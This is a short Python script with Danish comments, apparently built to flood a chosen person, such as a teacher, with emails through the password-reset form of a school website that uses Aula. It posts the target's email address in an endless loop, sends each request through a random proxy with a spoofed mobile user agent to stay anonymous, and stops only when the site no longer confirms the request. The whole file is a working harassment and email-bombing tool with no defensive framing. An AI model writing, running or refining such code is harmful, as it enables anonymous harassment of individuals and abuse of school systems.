import requests
import random
from colorama import Fore

""" Send e-mails til lære igennem specificeret skole-hjemmesider der bruger Aula, anonymt. """ 

# CONSTANTS
SKOLE = ''
EMAIL = ''

# UTILITIES
user_agent = {'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G925F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36'}

proxy = set()

with open("proxies.txt", "r") as file:
    content = file.readlines()
    for random_line in content:
        proxy.add(random_line.strip())

proxies = {'http': 'http://'+random.choice(list(proxy))}


def Adgangskode_Spammer():

    while True:

        res = requests.post(
            f'{SKOLE}/user/password', headers=user_agent, proxies=proxies,

            data = {
                'name'    : EMAIL, # E-mail af specificeret target.
                'form_id' : 'user_pass', 
                'op'      : 'Indsend'
            }
        )

        if 'Yderligere instruktioner' in res.text:
            print(f"{EMAIL} {Fore.RED}::{Fore.RESET} Har fået en anmodning.")

        else:
            print("Fejl, enten kan personen ikke modtage flere status-koder ellers er E-mailen ikke tilmeldt Aula...")
            return

          
Adgangskode_Spammer()
